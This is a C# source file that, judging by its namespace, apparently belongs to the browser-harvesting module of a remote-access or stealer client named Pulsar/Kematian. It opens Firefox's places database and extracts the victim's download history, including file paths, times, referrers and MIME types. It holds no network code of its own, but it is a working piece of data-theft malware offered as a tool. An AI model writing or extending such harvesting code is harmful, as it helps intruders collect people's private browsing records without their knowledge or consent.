using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Pulsar.Client.Kematian.Browsers.Gecko.Downloads
{
    public class DownloadsGecko
    {
        public static List<DownloadData> GetDownloads(string placesDbPath)
        {
            var downloads = new List<DownloadData>();
            
            if (!File.Exists(placesDbPath))
            {
                Debug.WriteLine($"Places database not found: {placesDbPath}");
                return downloads;
            }
            
            try
            {
                SQLiteHandler sqlDatabase = new SQLiteHandler(placesDbPath);
                
                if (!sqlDatabase.ReadTable("moz_downloads"))
                {
                    if (!sqlDatabase.ReadTable("moz_annos") || !sqlDatabase.ReadTable("moz_places"))
                    {
                        Debug.WriteLine("Failed to read download tables from database.");
                        return downloads;
                    }

                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                    {
                        try
                        {
                            string name = sqlDatabase.GetValue(i, "name");
                            if (name != null && (name.Contains("download") || name.Contains("destinationFileURI")))
                            {
                                string content = sqlDatabase.GetValue(i, "content");
                                string dateAdded = sqlDatabase.GetValue(i, "dateAdded") ?? DateTime.Now.ToString();

                                var download = new DownloadData
                                {
                                    Current_path = content,
                                    Target_path = content,
                                    Start_time = dateAdded,
                                    End_time = dateAdded,
                                };
                                
                                downloads.Add(download);
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing download at index {i}: {ex.Message}");
                        }
                    }
                }
                else
                {
                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                    {
                        try
                        {
                            var download = new DownloadData
                            {
                                Current_path = sqlDatabase.GetValue(i, "name"),
                                Target_path = sqlDatabase.GetValue(i, "target"),
                                Start_time = sqlDatabase.GetValue(i, "startTime"),
                                End_time = sqlDatabase.GetValue(i, "endTime"),
                                Mime_type = sqlDatabase.GetValue(i, "mimeType")
                            };

                            try { download.Referrer = sqlDatabase.GetValue(i, "source"); } catch { }

                            downloads.Add(download);
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing download at index {i}: {ex.Message}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error opening places database: {ex.Message}");
            }

            return downloads;
        }
    }
    
    public struct DownloadData
    {
        public string Current_path;
        public string Target_path;
        public string Start_time;
        public string Received_bytes;
        public string Total_bytes;
        public string Danger_type;
        public string End_time;
        public string Opened;
        public string Last_access_time;
        public string Referrer;
        public string Tab_url;
        public string Tab_referrer_url;
        public string Mime_type;
        public string Original_mime_type;
    }
} 